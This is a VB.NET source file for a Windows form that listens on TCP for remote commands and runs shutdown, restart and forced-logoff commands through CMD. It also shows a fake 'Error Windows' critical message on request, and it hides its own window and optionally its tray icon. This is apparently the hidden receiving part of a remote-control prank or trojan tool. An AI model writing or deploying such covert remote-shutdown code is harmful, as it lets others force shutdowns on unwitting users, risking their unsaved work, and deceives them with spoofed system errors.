Public Class Form8
    Private server As TCPController
    Private Sub OnlineReceived(ByVal sender As TCPController, ByVal Data As String)
        UpdateTextBox(TextBox1, Data)
    End Sub
    Private Delegate Sub UpdateTextDelegate(ByVal TB As TextBox, ByVal txt As String)
    Private Sub UpdateTextBox(ByVal TB As TextBox, ByVal txt As String)
        If TB.InvokeRequired Then
            TB.Invoke(New UpdateTextDelegate(AddressOf UpdateTextBox), New Object() {TB, txt})
        Else
            If txt IsNot Nothing Then TB.AppendText(txt)
        End If
    End Sub

    Private Sub Form8_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Try
            server.isListening = False
        Catch ex As Exception

        End Try
    End Sub
    Private Sub Form8_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Timer1.Enabled = True
        Timer3.Enabled = True
        server = New TCPController
        TextBox1.Text = ""
        AddHandler server.MessageReceived, AddressOf OnlineReceived
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        If TextBox1.Text <> "" Then
            If TextBox1.Text = "#reiniciar" Then
                Process.Start("CMD.exe", "/C shutdown /r /t 60")
                TextBox1.Clear()
            End If
            If TextBox1.Text = "#apagar" Then
                Process.Start("CMD.exe", "/C shutdown /s /f /t 60")
                TextBox1.Clear()
            End If
            If TextBox1.Text = "#nullshut" Then
                Process.Start("CMD.exe", "/C shutdown /a")
                TextBox1.Clear()
            End If
            If TextBox1.Text = "#SesionOff" Then
                Process.Start("CMD.exe", "/C shutdown /l /f /t 60")
                TextBox1.Clear()
            End If
            If TextBox1.Text = "#msgErr" Then
                MsgBox("Windows no ah podido recuperarse de un error en el sistema", MsgBoxStyle.Critical, "Error Windows")
            End If
            TextBox1.Clear()
        Else

        End If
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Try
            server.isListening = False
            Timer2.Enabled = False
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer3_Tick_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        Me.Hide()
        If My.Settings.icono = False Then
            NotifyIcon1.Visible = False
        Else
            NotifyIcon1.Visible = True
        End If
        Timer2.Stop()
    End Sub
End Class